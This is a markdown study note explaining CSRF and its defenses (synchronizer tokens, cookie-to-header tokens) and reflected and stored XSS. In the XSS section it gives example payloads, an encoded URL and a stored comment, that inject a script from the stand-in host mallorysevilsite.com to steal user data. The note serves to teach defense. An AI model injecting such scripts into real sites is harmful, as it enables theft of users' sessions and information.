# Security

## [**C**ross-**S**ite **R**equest **F**orgery](https://en.wikipedia.org/wiki/Cross-site_request_forgery)

CRSF exploits the trust that a site has in a user's browser to send malicious request disguised as normal user request to target website. Both the user and the target website can be victims of CRSF attack. 

CRSF attack can be done by specially-crafted image tags, hidden forms, and JavaScript XMLHttpRequests, even without interaction or knowledge of user.

## Prevention

Most CSRF prevention techniques work by embedding aditional data into request that allows server to determine validity of request.

### **S**ynchronizer **T**oken **P**attern

STP is a technique that injects unique and unpredictable token in all HTML forms rendered by server, so that each request from user contains this unique token. Attackers have no way to forge request with correct temporary token to pass server side validation.

```html
<input type="hidden" name="csrfmiddlewaretoke" value="KbyUmhTLMpYj7CD2di7JKP1P3qmLlkPt"/>
```

STP introduces complexity on server side due to burden associated with token validation on each request. There two types of token generation strategies.

1. One token per request - Each request has its unique token and server remembers the latest token, only the request with latest token can pass server side token validation if user opens multiple tabs of same html page.
1. One token per session - Inside single session, all requests by same html form share same token, this allows users to open multiple tabs and choose whichever one they like to submit request.

### Cookie-to-header token

On login, the web application sets a cookie containing a random token that ramains the same for the whole user session.

```HTTP
Set-Cookie: Csrf-token=i8XNjC4b8KVok4uw5RftR38Wgp2BFwql; expires=Thu, 23-Jul-2015 10:25:33 GMT; Max-Age=31449600; Path=/
```

JavaScipt on the client side reads its value and copies it into a custom HTTP Header sent with each transactional request.

```HTTP
X-Csrf-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql
```

The server validates presence and integrity of the token.

This method relies on same-origin policy which only allows JavaScript within same origin to be able to read the cookie's value, so that attackers are not able to read the token and forge a request.

The CSRF token cookie must not have `httpOnly` flag, because _HttpOnly_ cookie cannot be accessed by client-side APIs.

### Others

1. Checking HTTP Headers: `X-Requested-With`, `Referer`, `Origin`, this is insecure when http headers can be manipulated.

## [Cross-site scripting (XSS)](https://en.wikipedia.org/wiki/Cross-site_scripting)

Cross-site scripting attacks use know vulnerabilities in web-based applications to inject malicious script to pages hosted by server, when pages with malicious contents delivered to clients, attackers can gain access to users' sensitive information including session cookies.

### Types

#### Non-persistent (Reflected) XSS

An reflected attack is typically delivered via email or neutral website. Users may be tricked into clicking innocent-looking links with malicious script, which gets executed and stoles users' private information or submit malicious content to server.

DOM-based XSS is a type of non-persistent XSS attack that injected malacious script manipulates DOM directly instead of communicating with server to attack certain users.

A malicious url:

```html
http://bobssite.org?q=puppies%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E 
```

Actual content: 

```html
http://bobssite.org?q=puppies<script%20src="http://mallorysevilsite.com/authstealer.js"></script>
```

If it's clicked  `<script>` tag gets injected and `authstrealer.js` runs to steal users' private information.


#### Persistent (or stored) XSS

The _persistent_ XSS refers to malicious content being saved by the server and embedded into normal pages delivered to all users. Persistent XSS vulnerability is much more devastating than non-persistent one, cause all users are susceptible to attack.

If a website receives contents provided by users without sanitization, malicious scripts get injected to website.

```html
I love the puppies in this story! They're so cute!<script src="http://mallorysevilsite.com/authstealer.js">
```

Other users clicking on this text tag could be attacked.

### Prevention

1. HTML entity encoding, JavaScript escaping, CSS escaping, URL encoding.
1. User input validation